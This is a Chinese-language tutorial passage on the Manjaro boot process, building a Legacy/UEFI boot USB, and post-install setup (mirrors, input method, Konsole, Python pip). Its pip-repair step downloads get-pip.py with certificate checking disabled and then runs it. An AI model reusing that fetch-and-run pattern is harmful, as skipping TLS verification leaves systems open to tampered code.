        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  从manjaro的U盘启动设置开始，介绍manjaro系统的整个安装、配置过程</p><h1 id="制作启动U盘"><a href="#制作启动U盘" class="headerlink" title="制作启动U盘"></a>制作启动U盘</h1><p>  在这里顺便介绍一些系统启动、磁盘分区的相关基础知识，最后根据这些知识，完成启动u盘的安装</p><h2 id="系统启动"><a href="#系统启动" class="headerlink" title="系统启动"></a>系统启动</h2><p>  系统启动，本质上是识别并读取存储上的数据信息，并完成操作系统的加载，最后将计算机的控制权转交给操作系统。<br>  因此，系统启动的过程，即首先区分存储(往往是硬盘或U盘)的分区，其次执行启动分区的代码，完成系统分区中的操作系统加载，最后将计算机的控制权转交即可。。<br>  就目前来说，系统启动有两种常用的模式——<strong>Legacy mode</strong>和<strong>UEFI mode</strong></p><h3 id="Legacy-mode-BIOS-MBR"><a href="#Legacy-mode-BIOS-MBR" class="headerlink" title="Legacy mode(BIOS/MBR)"></a>Legacy mode(BIOS/MBR)</h3><p>Legacy mode，即通过MBR/BIOS进行引导的传统模式。BIOS只能识别设备，无法识别分区和文件信息。因此对应的引导的流程如下：</p><ul><li>从ROM执行BIOS代码进行自检</li><li>读取主引导记录(MBR) ：即按照指定的设备顺序，读取设备的第一个扇区<ol><li>如果其最后两个字节为<strong>55AAH</strong>，则读入该扇区，该扇区中包含设备的分区信息。之后将计算机控制权交给该主引导扇区的引导程序即可。</li><li>如果不相等，则继续尝试其他设备</li></ol></li></ul><p>这里借鉴<a href="https://zhuanlan.zhihu.com/p/26098509">知乎前辈的图</a>，给出主引导扇区的格式</p><p><img src="主引导扇区格式.png" alt="主引导扇区格式.png"></p><p>上面的图片很清晰的说明了Legacy mode下区分存储分区的方式，则当读入主引导分区并将计算机控制权交给引导程序后，可以获取分区情况，从而可以继续载入启动分区的代码，最终加载系统分区中的操作系统。这里同样借用<a href="https://zhuanlan.zhihu.com/p/31365115">知乎前辈的图</a>如下所示</p><p><img src="legacy-mode.png" alt="Legacy mode启动过程"></p><h3 id="UEFI-mode-UEFI-GPT"><a href="#UEFI-mode-UEFI-GPT" class="headerlink" title="UEFI mode(UEFI/GPT)"></a>UEFI mode(UEFI/GPT)</h3><p>UEFI mode，实际上是Legacy mode的替代品。与Legacy mode不同的是，UEFI mode不仅可以识别设备，其同时可以识别ROM、分区表和文件系统。因此对应的引导流程如下：</p><ul><li>运行ROM中的Pre-EFI初始化模块进行自检</li><li>加载位于ROM中的DXE<strong>(Driver Execution Environment)</strong><ol><li>枚举并加载位于各个设备ROM中的<strong>设备驱动</strong>，从而可以识别所有的设备信息</li><li>对<strong>磁盘设备</strong>，使用ROM中驱动识别磁盘上的<code>MBR</code>或<code>GPT</code><strong>(GUID Partition Table)</strong>分区表，从而获取磁盘的分区信息</li><li>对于<strong>每个</strong>分区，使用ROM或EFI系统分区中的文件系统驱动，从而完成分区中文件系统的加载。</li></ol></li><li>将计算机控制权交给EFI系统分区的引导程序即可</li></ul><p>实际上<code>MBR</code>和<code>GPT</code>都从磁盘的第一个扇区开始，其中GPT分区表的格式如所示</p><p><img src="gpt分区表格式.png" alt="gpt分区表格式"></p><p>可以看到，如果主板不支持UEFI，则其还是可以通过PMBR结构，实现类似于<strong>Legacy mode</strong>的引导；否则，其通过<strong>Partition Table</strong>，完成分区的识别，从而通过文件系统驱动，获取ESP分区的指定引导程序并完成引导，如下所示</p><p><img src="uefi-mode.png" alt="uefi-mode"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里再说一下个人的理解——实际上<strong>Legacy mode</strong>和<strong>UEFI mode</strong>本质没有区别，都是加载引导程序，从而去引导操作系统的加载。其区别在于</p><ul><li>ROM中的BIOS无法识别设备上的分区、文件等数据。因此将引导程序放在主引导扇区的固定位置，则BIOS将<strong>计算机的控制权转交给该引导程序</strong>。而引导程序可以通过读取设备的<strong>mbr</strong>分区表，完成操作系统的加载</li><li>ROM中的UEFI有相关的驱动，因此其可以识别分区、文件等数据。因此其通过读取设备的<strong>gpt</strong>分区表，完成操作系统的加载，在此之前<strong>无须转交计算机控制权</strong>。</li></ul><h2 id="制作manjaro启动U盘"><a href="#制作manjaro启动U盘" class="headerlink" title="制作manjaro启动U盘"></a>制作manjaro启动U盘</h2><p>这里我们分别构造适用于<strong>Legacy mode</strong>引导和适用于<strong>UEFI mode</strong>引导的manjaro启动u盘</p><h3 id="适用于Legacy-mode引导"><a href="#适用于Legacy-mode引导" class="headerlink" title="适用于Legacy mode引导"></a>适用于Legacy mode引导</h3><ul><li>首先，按照前面的分析，我们在磁盘上创建MBR分区表，实现磁盘的分区</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> fdisk /dev/sdX</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): o</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): p</span><br><span class="line">Partition number (1-4, default 1): </span><br><span class="line">First sector (2048-15646719, default 2048): </span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2048-15646719, default 15646719):</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): a</span><br><span class="line">Selected partition 1</span><br><span class="line">The bootable flag on partition 1 is enabled now.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mkfs.vfat -F32 /dev/sdXn</span><br></pre></td></tr></table></figure><ul><li>接着，向系统分区写入相关的操作系统数据</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S grub</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /mnt/&#123;iso,usb&#125;</span><br><span class="line"><span class="built_in">sudo</span> mount -o loop manjaro-kde-21.0.5-210519-linux510.iso /mnt/iso</span><br><span class="line"><span class="built_in">sudo</span> mount /dev/sdXn /mnt/usb</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> -a /mnt/iso/. /mnt/usb/</span><br><span class="line"><span class="built_in">sudo</span> umount /mnt/*</span><br></pre></td></tr></table></figure><ul><li>最后，将引导程序写入主引导扇区并完成其他设置即可</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grub-install --target=i386-pc --boot-directory=/mnt/usb/boot /dev/sdX</span><br></pre></td></tr></table></figure><p>这里由于manjaro镜像中已经有相关的配置文件<strong>boot/grub/grub.cfg</strong>，因此不需要在配置。此时，已经完成适用于<strong>Legacy mode</strong>的启动u盘</p><h3 id="适用于UEFI-mode引导"><a href="#适用于UEFI-mode引导" class="headerlink" title="适用于UEFI mode引导"></a>适用于UEFI mode引导</h3><p>由于<strong>UEFI mode</strong>会替代<strong>Legacy mode</strong>引导模式，因此这里同样给出适用于<strong>UEFI mode</strong>的引导</p><ul><li>首先，我们在磁盘上创建gpt分区表，实现磁盘的分区。这里需要说明的是，<strong>UEFI mode</strong>引导，其会在<strong>EFI分区(EFI system partition)</strong>中查找引导程序，因此一定需要有<strong>EFI分区/ESP</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> fdisk /dev/sdX</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): g                        </span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition number (1-128, default 1): </span><br><span class="line">First sector (2048-15646686, default 2048): </span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2048-15646686, default 15646686): </span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t</span><br><span class="line">Selected partition 1</span><br><span class="line">Partition <span class="built_in">type</span> or <span class="built_in">alias</span> (<span class="built_in">type</span> L to list all): 1</span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">&#x27;Linux filesystem&#x27;</span> to <span class="string">&#x27;EFI System&#x27;</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mkfs.vfat -F32 /dev/sdXn</span><br></pre></td></tr></table></figure><ul><li>接着，向<strong>EFI分区</strong>中写入操作系统相关数据</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /mnt/&#123;iso,usb&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mount /dev/sdXn /mnt/usb</span><br><span class="line"><span class="built_in">sudo</span> mount -o loop manjaro-kde-21.0.5-210519-linux510.iso /mnt/iso</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> -a /mnt/iso/. /mnt/usb</span><br><span class="line"><span class="built_in">sudo</span> umount /mnt/iso</span><br></pre></td></tr></table></figure><ul><li>最后，将引导程序写入<strong>EFI分区</strong>，并完成相关的配置即可</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grub-install --removable --no-floppy --target=x86_64-efi --boot-directory=/mnt/usb/boot --efi-directory=/mnt/usb</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> umount /mnt/usb</span><br></pre></td></tr></table></figure><p>这里由于manjaro镜像中已经有相关的配置文件<strong>boot/grub/grub.cfg</strong>，因此不需要在配置grub。此时，已经完成适用于<strong>UEFI mode</strong>的启动u盘</p><h1 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h1><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>  在konsole中输入如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman-mirrors -i -c China -m rank &amp;&amp; <span class="built_in">sudo</span> pacman -Syy</span><br></pre></td></tr></table></figure><br>  然后从弹出的框中选择一个最好的源即可</p><h2 id="安装yay"><a href="#安装yay" class="headerlink" title="安装yay"></a>安装yay</h2><p>  manjaro除了pacman以外，yay同样是重要的一个软件安装途径，如下进行安装和设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S yay &amp;&amp; yay --aururl <span class="string">&quot;https://aur.tuna.tsinghua.edu.cn&quot;</span> --save</span><br></pre></td></tr></table></figure><br>  yay镜像有连接次数限制，因此有时需要恢复成原始资源网站，即<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay --aururl <span class="string">&quot;https://aur.archlinux.org&quot;</span> --save</span><br></pre></td></tr></table></figure></p><h2 id="安装neovim"><a href="#安装neovim" class="headerlink" title="安装neovim"></a>安装neovim</h2><p>  使用neovim作为系统的文本编辑器，在终端输入如下命令<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S neovim xsel &amp;&amp; <span class="built_in">sudo</span> <span class="built_in">ln</span> -sf /usr/bin/nvim /usr/bin/vi &amp;&amp; <span class="built_in">mkdir</span> ~/.config/nvim &amp;&amp; /bin/bash -c <span class="string">&#x27;echo &quot;set clipboard+=unnamedplus\nlet g:python_recommended_style = 0&quot; &gt; ~/.config/nvim/init.vim&#x27;</span></span><br></pre></td></tr></table></figure></p><h2 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h2><h3 id="系统dpi"><a href="#系统dpi" class="headerlink" title="系统dpi"></a>系统dpi</h3><p>  点击屏幕左下角的<code>application launcher</code>，或者点击<code>Win</code>建，打开<code>System Settings</code>，选择<code>Display Configuration</code>选项，通过设置<strong>Resolution</strong>和<strong>Global scale</strong>完成系统分辨率和DPI的设置<br>  <img src="系统dpi设置.PNG" alt="系统dpi设置"></p><h3 id="字体dpi"><a href="#字体dpi" class="headerlink" title="字体dpi"></a>字体dpi</h3><p>  点击屏幕左下角的<code>application launcher</code>，或者点击<code>Win</code>建，打开<code>System Settings</code>，选择<code>Appearance =&gt; fonts</code>选项，通过设置<strong>General</strong>、<strong>Fixed width</strong>、<strong>Small</strong>、<strong>Toolbar</strong>、<strong>Menu</strong>和<strong>Window title</strong>以及<strong>Force font DPI</strong>，完成系统中字体DPI的设置<br>  <img src="字体dpi设置.PNG" alt="字体dpi设置"></p><h3 id="登录窗口dpi"><a href="#登录窗口dpi" class="headerlink" title="登录窗口dpi"></a>登录窗口dpi</h3><p>  即manajaro登录界面的dpi，这里通过编辑sddm的设置文件——即<code>\etc\sddm.conf</code>完成，添加或修改如下项的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Wayland]</span><br><span class="line">EnableHiDPI=true</span><br><span class="line"></span><br><span class="line">[X11]</span><br><span class="line">EnableHiDPI=true</span><br><span class="line">ServerArguments=-nolisten tcp -dpi 192</span><br></pre></td></tr></table></figure><h2 id="安装输入法"><a href="#安装输入法" class="headerlink" title="安装输入法"></a>安装输入法</h2><h3 id="下载输入法"><a href="#下载输入法" class="headerlink" title="下载输入法"></a>下载输入法</h3><p>在konsole中执行如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S fcitx5-im fcitx5-rime</span><br></pre></td></tr></table></figure></p><p>通过 <strong>~/.pam_environment</strong> 配置环境变量，写入如下内容<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GTK_IM_MODULE DEFAULT=fcitx</span><br><span class="line">QT_IM_MODULE  DEFAULT=fcitx</span><br><span class="line">XMODIFIERS    DEFAULT=@im=fcitx</span><br><span class="line">INPUT_METHOD  DEFAULT=fcitx</span><br><span class="line">SDL_IM_MODULE DEFAULT=fcitx</span><br></pre></td></tr></table></figure><br>  <br>然后重启更新计算机环境</p><h3 id="配置输入法"><a href="#配置输入法" class="headerlink" title="配置输入法"></a>配置输入法</h3><p>  点击右下角菜单栏的键盘托盘图标，点击<code>设置</code>，添加<code>rime</code>输入法<br>  <img src="配置输入法.PNG" alt="配置输入法"><br>  首先创建<strong>~/.local/share/fcitx5/rime/default.custom.yaml</strong>，并输入如下内容<br>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">schema_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">schema:</span> <span class="string">luna_pinyin_simp</span></span><br></pre></td></tr></table></figure><br>  接着创建<strong>~/.local/share/fcitx5/rime/luna_pinyin_simp.custom.yaml</strong>，并输入如下内容<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">switches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ascii_mode</span></span><br><span class="line">      <span class="attr">reset:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">states:</span> [<span class="string">&quot;中文&quot;</span>, <span class="string">&quot;西文&quot;</span>]</span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">full_shape</span></span><br><span class="line">      <span class="attr">reset:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">states:</span> [<span class="string">&quot;半角&quot;</span>, <span class="string">&quot;全角&quot;</span>]</span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">zh_simp</span></span><br><span class="line">      <span class="attr">reset:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">states:</span> [<span class="string">&quot;繁體&quot;</span>, <span class="string">&quot;简体&quot;</span>]</span><br><span class="line">      </span><br><span class="line">  <span class="attr">recognizer/patterns:</span></span><br><span class="line">    <span class="attr">reverse_lookup:</span> <span class="string">&quot;[a-z]*&#x27;?$&quot;</span></span><br><span class="line">    </span><br><span class="line">  <span class="attr">punctuator/half_shape:</span></span><br><span class="line">    <span class="string">&quot;,&quot;</span> <span class="string">:</span> <span class="string">&quot;，&quot;</span></span><br><span class="line">    <span class="string">&quot;.&quot;</span> <span class="string">:</span> <span class="string">&quot;。&quot;</span></span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span> <span class="string">:</span> <span class="string">&quot;《&quot;</span></span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span> <span class="string">:</span> <span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    <span class="string">&quot;/&quot;</span> <span class="string">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="string">&quot;?&quot;</span> <span class="string">:</span> <span class="string">&quot;?&quot;</span></span><br><span class="line">    <span class="string">&quot;;&quot;</span> <span class="string">:</span> <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="string">&quot;:&quot;</span> <span class="string">:</span> <span class="string">&quot;:&quot;</span></span><br><span class="line">    <span class="string">&quot;\&quot;&quot;</span> <span class="string">:</span> <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;\\&quot;</span><span class="string">:</span> <span class="string">&quot;、&quot;</span></span><br><span class="line">    <span class="string">&quot;|&quot;</span> <span class="string">:</span> <span class="string">&quot;|&quot;</span></span><br><span class="line">    <span class="string">&quot;`&quot;</span> <span class="string">:</span> <span class="string">&quot;`&quot;</span></span><br><span class="line">    <span class="string">&quot;~&quot;</span> <span class="string">:</span> <span class="string">&quot;~&quot;</span></span><br><span class="line">    <span class="string">&quot;!&quot;</span> <span class="string">:</span> <span class="string">&quot;!&quot;</span></span><br><span class="line">    <span class="string">&quot;@&quot;</span> <span class="string">:</span> <span class="string">&quot;@&quot;</span></span><br><span class="line">    <span class="string">&quot;#&quot;</span> <span class="string">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line">    <span class="string">&quot;%&quot;</span> <span class="string">:</span> <span class="string">&quot;%&quot;</span></span><br><span class="line">    <span class="string">&quot;$&quot;</span> <span class="string">:</span> <span class="string">&quot;$&quot;</span></span><br><span class="line">    <span class="string">&quot;^&quot;</span> <span class="string">:</span> <span class="string">&quot;^&quot;</span></span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span> <span class="string">:</span> <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">    <span class="string">&quot;*&quot;</span> <span class="string">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="string">&quot;(&quot;</span> <span class="string">:</span> <span class="string">&quot;(&quot;</span></span><br><span class="line">    <span class="string">&quot;)&quot;</span> <span class="string">:</span> <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="string">&quot;-&quot;</span> <span class="string">:</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">    <span class="string">&#x27;_&#x27;</span> <span class="string">:</span> <span class="string">——</span></span><br><span class="line">    <span class="string">&quot;+&quot;</span> <span class="string">:</span> <span class="string">&quot;+&quot;</span></span><br><span class="line">    <span class="string">&quot;=&quot;</span> <span class="string">:</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="string">&quot;[&quot;</span> <span class="string">:</span> <span class="string">&quot;[&quot;</span></span><br><span class="line">    <span class="string">&quot;]&quot;</span> <span class="string">:</span> <span class="string">&quot;]&quot;</span></span><br><span class="line">    <span class="string">&quot;&#123;&quot;</span> <span class="string">:</span> <span class="string">&quot;&#123;&quot;</span></span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span> <span class="string">:</span> <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure></p><p>  创建<strong>~/.config/fcitx5/conf/classicui.conf</strong>，并输入如下内容调整输入框的字体设置<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 按屏幕 DPI 使用</span><br><span class="line">PerScreenDPI=True</span><br><span class="line"></span><br><span class="line"># Font (设置成你喜欢的字体)</span><br><span class="line">Font=&quot;Noto Sans Regular 13&quot;</span><br></pre></td></tr></table></figure></p><p>  然后切换至rime输入法，随便输入相关信息，并输入 <code>ctrl + ~</code>，切换至 <strong>朙月拼音·简化字</strong>输入法。最后，点击右下角菜单栏的键盘托盘图标，选择<code>deploy</code>重新部署rime输入法。<br>  然后重启更新计算机环境。<br>  最后点击右下角菜单栏的键盘托盘图标，点击<code>设置</code>，删除<code>Keyboard-English(US)</code>输入法即可</p><h2 id="设置konsole"><a href="#设置konsole" class="headerlink" title="设置konsole"></a>设置konsole</h2><h3 id="关闭yakuake"><a href="#关闭yakuake" class="headerlink" title="关闭yakuake"></a>关闭yakuake</h3><p>  即点击屏幕左下角的<code>application launcher</code>，或者点击<code>Win</code>建，打开<code>System Settings</code>，选择<code>Workspace =&gt; Startup and Shutdown =&gt; Autostart</code>选项，删除<strong>yakuake</strong>项。<br>  <img src="关闭yakuake.png" alt="关闭yakuake"></p><h3 id="设置快捷键"><a href="#设置快捷键" class="headerlink" title="设置快捷键"></a>设置快捷键</h3><p>  即点击屏幕左下角的<code>application launcher</code>，或者点击<code>Win</code>建，打开<code>System Settings</code>，选择<code>Workspace =&gt; Shortcuts =&gt; Shortcuts</code>选项，点击 <strong>Add Application</strong>选项，添加<code>konsole</code>，并设置相关的快捷键即可。<br>  <img src="设置konsole快捷键.PNG" alt="设置konsole快捷键"></p><h3 id="设置字体"><a href="#设置字体" class="headerlink" title="设置字体"></a>设置字体</h3><p>  打开konsole，在界面上方的<code>Settings =&gt; Edit Current Profile</code>，选择<code>Appearance</code>，在<strong>Font</strong>对应字段进行设置即可<br>  <img src="设置konsole字体.PNG" alt="设置konsole字体"></p><h2 id="设置护眼"><a href="#设置护眼" class="headerlink" title="设置护眼"></a>设置护眼</h2><p>  这里使用跨平台的<strong>Stretchly</strong>软件，进行定时的息屏休息功能</p><h3 id="安装Stretchly"><a href="#安装Stretchly" class="headerlink" title="安装Stretchly"></a>安装Stretchly</h3><p>  首先在<a href="https://github.com/hovancik/stretchly/releases">链接</a>中，下载<em>Stretchly-[version].pacman</em>文件</p><p>  在konsole中执行如下bash命令，完成软件的安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -U $(<span class="built_in">ls</span> | grep <span class="string">&quot;Stretchly&quot;</span>)</span><br></pre></td></tr></table></figure></p><h3 id="配置Stretchly"><a href="#配置Stretchly" class="headerlink" title="配置Stretchly"></a>配置Stretchly</h3><p>  首先，设置其为自动启动程序，即点击屏幕左下角的<code>application launcher</code>，或者点击<code>Win</code>建，打开<code>System Settings</code>，选择<code>Workspace =&gt; Startup and Shutdown =&gt; Autostart</code>选项，添加<strong>Stretchly</strong>项。</p><p>  <img src="自动启动stretchly.PNG" alt="设置stretchly自动启动"></p><p>  接着启动<em>Stretchly</em>，完成软件的设置即可。即点击屏幕左下角的<code>application launcher</code>，或者点击<code>Win</code>建，在搜索框输入<strong>Stretchly</strong>，然后点击软件即可。之后按照软件的引导，完成相关的配置即可</p><p>  <img src="启动stretchly.PNG" alt="启动stretchly"></p><h2 id="设置python"><a href="#设置python" class="headerlink" title="设置python"></a>设置python</h2><h3 id="安装python3"><a href="#安装python3" class="headerlink" title="安装python3"></a>安装python3</h3><p>  系统已经默认安装</p><h3 id="安装pip3"><a href="#安装pip3" class="headerlink" title="安装pip3"></a>安装pip3</h3><p>  系统已经默认安装</p><h3 id="安装python2"><a href="#安装python2" class="headerlink" title="安装python2"></a>安装python2</h3><p>在konsole中执行如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S python2</span><br></pre></td></tr></table></figure></p><h3 id="安装pip2"><a href="#安装pip2" class="headerlink" title="安装pip2"></a>安装pip2</h3><p>在konsole中执行如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S python2-pip</span><br></pre></td></tr></table></figure></p><h3 id="配置pip"><a href="#配置pip" class="headerlink" title="配置pip"></a>配置pip</h3><p>在konsole中执行如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U &amp;&amp; python2 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></p><p>  有时python的pip会出现相关的错误信息，则执行如下命令重新安装pip<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://bootstrap.pypa.io/pip/$(python2 -V 2&gt;&amp;1 | sed <span class="string">&#x27;s/\./ /g&#x27;</span> | awk <span class="string">&#x27;&#123;printf(&quot;%s.%s&quot;, $2, $3)&#125;&#x27;</span>)/get-pip.py &amp;&amp; python2 get-pip.py &amp;&amp; <span class="built_in">rm</span> -rf get-pip.py &amp;&amp; python2 -m pip install pathlib2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://bootstrap.pypa.io/pip/$(python3 -V 2&gt;&amp;1 | sed <span class="string">&#x27;s/\./ /g&#x27;</span> | awk <span class="string">&#x27;&#123;printf(&quot;%s.%s&quot;, $2, $3)&#125;&#x27;</span>)/get-pip.py -O get-pip3.py &amp;&amp; python3 get-pip3.py &amp;&amp; <span class="built_in">rm</span> -rf get-pip3.py</span><br></pre></td></tr></table></figure><br>  然后再执行上述的命令即可</p><h2 id="设置C-C"><a href="#设置C-C" class="headerlink" title="设置C/C++"></a>设置C/C++</h2><p>在konsole中执行如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S 